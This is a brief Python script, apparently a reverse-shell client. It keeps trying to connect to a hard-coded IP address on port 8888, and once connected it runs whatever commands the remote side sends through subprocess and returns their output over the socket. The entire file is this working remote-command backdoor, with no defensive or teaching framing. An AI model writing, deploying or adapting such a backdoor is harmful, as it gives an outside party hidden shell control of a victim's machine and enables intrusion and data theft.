import socket,time,subprocess,sys

host = '172.25.160.132' #host ip
port = 8888 #random port
addr = (host,port)


#constantly looking for host server
connecting = True
while connecting == True:
    time.sleep(3)
    print('[*]Trying to connect')
    try:
        c = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        c.connect(addr)
        connecting = False
    except:
        connecting = True

if connecting == False:
    print('[*]connected')
    #recieving and executing commands from the server
    while connecting == False:
        cmdbytes = c.recv(5008)
        cmd = cmdbytes.decode('utf-8')
            #quit msg 
        if cmd == 'quit_msg_init':
            connecting = True

            #executing cmd and sending results
        else:
            cmdr = subprocess.getoutput(cmd)
            #sends size of byte for dynamic buffer server end
            bytesize = len((cmdr).encode('utf-16'))
            print('size is '+str(bytesize))
            c.send(bytes(str(bytesize),'utf-16'))
            time.sleep(.8)
            #sends actual results
            c.send(bytes(cmdr ,'utf-16'))